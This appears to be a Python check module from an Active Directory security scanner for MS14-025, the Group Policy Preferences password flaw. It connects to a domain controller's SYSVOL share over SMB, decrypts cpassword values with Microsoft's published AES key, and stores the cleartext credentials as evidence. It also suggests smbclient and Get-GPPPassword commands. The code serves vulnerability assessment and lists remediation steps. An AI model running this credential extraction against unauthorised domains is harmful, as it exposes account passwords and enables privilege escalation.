r"""
MS14-025 — Group Policy Preferences (GPP) Passwords.

The historical bug: ``cpassword="..."`` attributes embedded in GPP
XML files (Groups.xml, ScheduledTasks.xml, Services.xml, DataSources.xml,
Drives.xml, Printers.xml) under
``\\<DC>\SYSVOL\<domain>\Policies\{GUID}\`` are encrypted with an
AES-256 key Microsoft published in MSDN — making them effectively
plaintext. Any authenticated domain user can read them.

This check, with operator credentials available:
  1. Opens an SMB session against the DC's SYSVOL share.
  2. Walks every Policies\{GUID}\ subtree.
  3. For each candidate XML, grep-equivalents cpassword= and
     userName= (and a few sibling attrs).
  4. Decrypts the cpassword with the public AES key.
  5. Returns CRITICAL with the cleartext credentials in evidence.

Without credentials (Kerberos-only without ticket-cache + SMB hooks
unwired, or anonymous bind) it falls back to the prior INDETERMINATE
behaviour from PR #30 — listing the GPOs and telling the operator to
grep manually with smbclient or Get-GPPPassword.

Field bug history (PR #30): the original check just counted
``groupPolicyContainer`` LDAP entries and reported "HIGH vulnerable"
on every domain — Default Domain Policy and Default Domain Controllers
Policy GPOs always exist, so this fired clean. The honest
INDETERMINATE fallback landed in PR #30. This file finishes the job
by actually doing the SMB-grep when credentials are available.
"""

from __future__ import annotations

import re
from typing import Any

from kerb_map.modules.cves.cve_base import (
    PATCH_STATUS_INDETERMINATE,
    CVEBase,
    CVEResult,
    Severity,
)
from kerb_map.output.logger import Logger

log = Logger()


# ────────────────────────────────────────────────────────────────────── #
#  cpassword decryption                                                  #
# ────────────────────────────────────────────────────────────────────── #
#
# The AES-256 key is the well-known constant Microsoft published in
# the GPP XML schema documentation
# (https://msdn.microsoft.com/en-us/library/cc422924.aspx). IV is
# all-zero, padding is PKCS#7. The encrypted blob is base64 with
# Microsoft's non-standard right-padding (omits trailing '=').

_GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057990209b09a433b66c1b"
)
_GPP_IV = b"\x00" * 16


def decrypt_cpassword(b64_blob: str) -> str | None:
    """Decrypt an MS-published cpassword. Returns None on any failure
    (truncated blob, wrong padding, AES module unavailable, etc.) so
    the caller can degrade gracefully rather than crash the whole CVE
    scan run."""
    if not b64_blob:
        return None
    try:
        from base64 import b64decode

        # Microsoft's non-standard base64 right-pads with the wrong
        # number of '=' — we restore them ourselves.
        padded = b64_blob + "=" * ((-len(b64_blob)) % 4)
        ct = b64decode(padded)
    except Exception:
        return None
    try:
        # pycryptodomex is a hard impacket dep — guaranteed importable
        # wherever kerb-map runs. Avoids adding a `cryptography` dep
        # for one AES-256-CBC call.
        from Cryptodome.Cipher import AES
        cipher = AES.new(_GPP_KEY, AES.MODE_CBC, _GPP_IV)
        pt = cipher.decrypt(ct)
    except Exception:
        return None
    # PKCS#7 unpad
    if not pt:
        return None
    pad_len = pt[-1]
    if pad_len < 1 or pad_len > 16:
        return None
    pt = pt[:-pad_len]
    try:
        return pt.decode("utf-16-le")
    except UnicodeDecodeError:
        return None


# ────────────────────────────────────────────────────────────────────── #
#  XML extraction                                                        #
# ────────────────────────────────────────────────────────────────────── #
#
# Regex rather than XML parser: GPP XMLs are well-formed but the
# attribute we care about (cpassword) lives on different element types
# across the six file kinds (User in Groups.xml, Task in
# ScheduledTasks.xml, NewName in Drives.xml, etc.). A targeted regex
# on the attribute name is simpler and cheaper than dispatching per
# file kind, and survives the schema variants seen in the wild.

_CPASSWORD_RE = re.compile(rb'cpassword\s*=\s*"([^"]+)"', re.IGNORECASE)
_NAME_RE      = re.compile(rb'\bname\s*=\s*"([^"]*)"', re.IGNORECASE)

# Priority order for picking the username sibling. ``newName`` is in
# Drives.xml's "rename to" field — it's often "" — so it ranks last.
# Each pattern is checked in order; first non-empty match wins. Field
# bug from a real lab seed: a single-pattern alternation matched
# ``newName=""`` before ``userName="helpdesk_admin"`` because newName
# appears earlier in Groups.xml — making the operator-facing finding
# read ``user='<unknown>'`` when we had the username right there.
_USERNAME_PATTERNS = [
    re.compile(rb'\buserName\s*=\s*"([^"]*)"', re.IGNORECASE),
    re.compile(rb'\baccountName\s*=\s*"([^"]*)"', re.IGNORECASE),
    re.compile(rb'\brunAs\s*=\s*"([^"]*)"', re.IGNORECASE),
    re.compile(rb'\bnewName\s*=\s*"([^"]*)"', re.IGNORECASE),
]

# Case-insensitive match — SYSVOL is served by Windows / Samba with
# case-insensitive lookups, but the listing returns the underlying
# filesystem case verbatim. A directory accidentally created on a
# case-sensitive Linux box (e.g. some Samba-provisioned labs use
# uppercase MACHINE / GROUPS.XML) would otherwise miss the match.
_GPP_FILES_LOWER = frozenset({
    "groups.xml", "scheduledtasks.xml", "services.xml",
    "datasources.xml", "drives.xml", "printers.xml",
})


def extract_cpasswords(xml_blob: bytes) -> list[dict[str, str | None]]:
    """Pull every (cpassword, username, label) tuple from a GPP XML
    blob. Returns one entry per match — XMLs commonly carry multiple
    accounts (e.g. helpdesk + service in the same Groups.xml)."""
    out: list[dict[str, str | None]] = []
    for cmatch in _CPASSWORD_RE.finditer(xml_blob):
        b64 = cmatch.group(1).decode("ascii", errors="replace")
        # Find the sibling userName/name in the same enclosing element —
        # cheap heuristic: nearest match within +/- 512 bytes around
        # the cpassword position. (Real GPP <Properties .../> elements
        # carry a dozen+ attributes, so the sibling can sit hundreds of
        # bytes away when each attribute is on its own indented line.)
        start, end = max(0, cmatch.start() - 512), min(len(xml_blob), cmatch.end() + 512)
        window = xml_blob[start:end]
        username = None
        for pat in _USERNAME_PATTERNS:
            m = pat.search(window)
            if m and m.group(1):
                username = m.group(1).decode("utf-8", errors="replace")
                break
        n = _NAME_RE.search(window)
        out.append({
            "cpassword_b64": b64,
            "cleartext":     decrypt_cpassword(b64),
            "username":      username,
            "label":         n.group(1).decode("utf-8", errors="replace") if n else None,
        })
    return out


# ────────────────────────────────────────────────────────────────────── #
#  CVE check                                                             #
# ────────────────────────────────────────────────────────────────────── #


class GPPPasswords(CVEBase):
    CVE_ID = "MS14-025"
    NAME = "GPP Passwords (cpassword)"

    def check(self) -> CVEResult:
        log.info(f"Checking {self.CVE_ID} ({self.NAME})...")
        gpos = self._find_gpos()
        evidence: dict[str, Any] = {
            "gpo_count": len(gpos),
            "gpo_paths": gpos[:5],
        }

        if not gpos:
            return CVEResult(
                cve_id=self.CVE_ID,
                name=self.NAME,
                severity=Severity.INFO,
                vulnerable=False,
                reason="No GPOs visible via LDAP — SYSVOL likely empty.",
                evidence=evidence,
                remediation="N/A",
                next_step="",
            )

        if not self._has_smb_credentials():
            return self._indeterminate_result(evidence)

        # Have credentials — try the real grep.
        try:
            findings = self._smb_grep_sysvol()
        except _SmbUnavailable as e:
            evidence["smb_error"] = str(e)
            return self._indeterminate_result(evidence,
                extra_reason="SMB unreachable — falling back to operator grep.")

        if not findings:
            return CVEResult(
                cve_id=self.CVE_ID,
                name=self.NAME,
                severity=Severity.INFO,
                vulnerable=False,
                reason=(
                    f"Walked {len(gpos)} GPO(s) over SMB — no cpassword found "
                    f"in any GPP XML. Domain is patched or never used GPP."
                ),
                evidence={**evidence, "files_checked": True, "matches": 0},
                remediation="N/A — already clean.",
                next_step="",
                patch_status="confirmed via SMB-grep — clean",
            )

        # Found cleartext credentials. CRITICAL.
        evidence["matches"] = [
            {k: v for k, v in m.items() if k != "cpassword_b64"}
            for m in findings
        ]
        evidence["match_count"] = len(findings)
        sample = findings[0]
        sample_user = sample.get("username") or sample.get("label") or "<unknown>"
        return CVEResult(
            cve_id=self.CVE_ID,
            name=self.NAME,
            severity=Severity.CRITICAL,
            vulnerable=True,
            reason=(
                f"Found {len(findings)} cleartext password(s) in GPP XML on "
                f"SYSVOL. Sample: user={sample_user!r}, "
                f"cleartext={'***' if sample.get('cleartext') else 'decrypt-failed'}. "
                f"Any authenticated domain user can read these."
            ),
            evidence=evidence,
            remediation=(
                "1. Apply KB2962486 on all systems.\n"
                "2. Delete the offending GPP XML files from SYSVOL.\n"
                "3. Reset every password listed above on the affected accounts."
            ),
            next_step=(
                f"# Pull the offending XMLs for review:\n"
                f"smbclient -U '{self.domain}\\<USER>%<PASS>' "
                f"//{self.dc_ip}/SYSVOL "
                f"-c 'recurse ON; mask *.xml; prompt OFF; mget *'"
            ),
            patch_status="confirmed vulnerable via SMB-grep",
            references=[
                "https://support.microsoft.com/en-us/topic/"
                "ms14-025-vulnerability-in-group-policy-preferences-could-allow-"
                "elevation-of-privilege-may-13-2014-"
                "60734e15-af79-26ca-ea53-8cd617073c30",
            ],
        )

    # ------------------------------------------------------------------ #
    #  GPO discovery                                                     #
    # ------------------------------------------------------------------ #

    def _find_gpos(self) -> list[str]:
        entries = self.ldap.query(
            search_filter="(objectClass=groupPolicyContainer)",
            attributes=["displayName", "gPCFileSysPath"],
        )
        paths = []
        for e in entries:
            path = str(e["gPCFileSysPath"].value or "")
            name = str(e["displayName"].value or "Unknown GPO")
            if path:
                paths.append(f"{name}: {path}")
        return paths

    # ------------------------------------------------------------------ #
    #  SMB walk                                                           #
    # ------------------------------------------------------------------ #

    def _has_smb_credentials(self) -> bool:
        if not self.username:
            return False
        if self.password or self.nthash:
            return True
        # Kerberos-only: we'd need to negotiate GSSAPI through impacket's
        # SMBConnection; not wired yet so degrade to indeterminate.
        return False

    def _smb_grep_sysvol(self) -> list[dict[str, str | None]]:
        """Connect, walk Policies\\, return every cpassword finding.

        Wraps every impacket-side error in _SmbUnavailable so the
        caller can degrade to INDETERMINATE rather than crash the
        whole CVE scan run.
        """
        smb = self._connect_smb()
        try:
            return list(self._walk_policies(smb))
        finally:
            try:
                smb.close()
            except Exception:
                pass

    def _connect_smb(self):
        try:
            from impacket.smbconnection import SMBConnection
        except ImportError as e:
            raise _SmbUnavailable(f"impacket SMBConnection import failed: {e}") from e
        try:
            smb = SMBConnection(self.dc_ip, self.dc_ip, sess_port=445, timeout=10)
        except Exception as e:
            raise _SmbUnavailable(f"SMB TCP connect failed: {e}") from e
        try:
            lm_hash = ""
            nt_hash = self.nthash or ""
            if nt_hash and ":" in nt_hash:
                lm_hash, nt_hash = nt_hash.split(":", 1)
            smb.login(
                self.username,
                self.password or "",
                self.domain,
                lm_hash,
                nt_hash,
            )
        except Exception as e:
            raise _SmbUnavailable(f"SMB authentication failed: {e}") from e
        return smb

    def _walk_policies(self, smb):
        """Yield {cpassword_b64, cleartext, username, label, path}
        for every match found under Policies\\."""
        share = "SYSVOL"
        domain_dir = self.domain.lower()
        # Walk: \<domain>\Policies\{GUID}\... — kerb-map chooses to
        # only descend into Policies\ rather than the whole share so we
        # don't accidentally walk scripts\ or Logon\ on huge SYSVOLs.
        root = f"{domain_dir}\\Policies"
        try:
            top = smb.listPath(share, f"{root}\\*")
        except Exception as e:
            raise _SmbUnavailable(f"could not list {share}\\{root}: {e}") from e

        for entry in top:
            name = entry.get_longname()
            if name in (".", "..") or not entry.is_directory():
                continue
            yield from self._walk_gpo(smb, share, f"{root}\\{name}")

    def _walk_gpo(self, smb, share: str, gpo_root: str):
        # GPP XMLs live under Machine\Preferences\* and User\Preferences\*.
        # Walk both subtrees; cap depth defensively at 4 levels under the
        # GPO root (real GPO trees are ~3 deep).
        stack = [(gpo_root, 0)]
        while stack:
            current, depth = stack.pop()
            if depth > 5:
                continue
            try:
                listing = smb.listPath(share, f"{current}\\*")
            except Exception:
                continue
            for entry in listing:
                name = entry.get_longname()
                if name in (".", ".."):
                    continue
                full = f"{current}\\{name}"
                if entry.is_directory():
                    stack.append((full, depth + 1))
                    continue
                if name.lower() not in _GPP_FILES_LOWER:
                    continue
                blob = self._read_file(smb, share, full)
                if not blob:
                    continue
                for finding in extract_cpasswords(blob):
                    finding["path"] = full
                    yield finding

    @staticmethod
    def _read_file(smb, share: str, path: str) -> bytes:
        """Pull a single XML over SMB into memory. GPP XMLs are
        kilobytes at most so the whole-file read is fine.

        Uses ``getFile`` rather than ``openFile`` + ``readFile``
        because the latter pair takes a numeric ``treeId`` (from
        ``connectTree``); operating on raw share names there
        silently returned zero bytes — a real field bug discovered
        running this against the Samba lab.
        """
        chunks: list[bytes] = []
        try:
            smb.getFile(share, path, callback=lambda data: chunks.append(data))
        except Exception:
            return b""
        return b"".join(chunks)

    # ------------------------------------------------------------------ #
    #  Fallback                                                           #
    # ------------------------------------------------------------------ #

    def _indeterminate_result(self, evidence: dict, extra_reason: str = "") -> CVEResult:
        reason_prefix = (extra_reason + " " if extra_reason else "")
        return CVEResult(
            cve_id=self.CVE_ID,
            name=self.NAME,
            severity=Severity.INFO,
            vulnerable=False,
            reason=(
                f"{reason_prefix}Found {evidence['gpo_count']} GPO(s) in SYSVOL — "
                f"kerb-map cannot grep the XML files for `cpassword=` without "
                f"SMB credentials. Manually verify; default Domain Policy "
                f"GPOs alone are not vulnerable."
            ),
            evidence=evidence,
            remediation=(
                "1. Apply KB2962486 on all systems.\n"
                "2. Delete existing GPP XML files containing cpassword from SYSVOL.\n"
                "3. Reset any passwords that were stored in GPP."
            ),
            next_step=(
                f"# Grep SYSVOL for cpassword from a Linux box:\n"
                f"smbclient -U '{self.domain}\\<USER>%<PASS>' "
                f"//{self.dc_ip}/SYSVOL -c 'recurse ON; mask *.xml; prompt OFF; mget *' "
                f"&& grep -r 'cpassword=' .\n"
                f"# OR PowerShell on a domain-joined host:\n"
                f"Get-GPPPassword   # PowerSploit\n"
                f"# OR impacket:\n"
                f"Get-GPPPassword.py {self.domain}/<USER>:<PASS>@{self.dc_ip}"
            ),
            patch_status=PATCH_STATUS_INDETERMINATE,
            references=[
                "https://support.microsoft.com/en-us/topic/"
                "ms14-025-vulnerability-in-group-policy-preferences-could-allow-"
                "elevation-of-privilege-may-13-2014-"
                "60734e15-af79-26ca-ea53-8cd617073c30",
            ],
        )


class _SmbUnavailable(Exception):
    """Raised when SMB grep can't run (network / auth / impacket import).
    Caller falls back to INDETERMINATE rather than killing the CVE scan."""
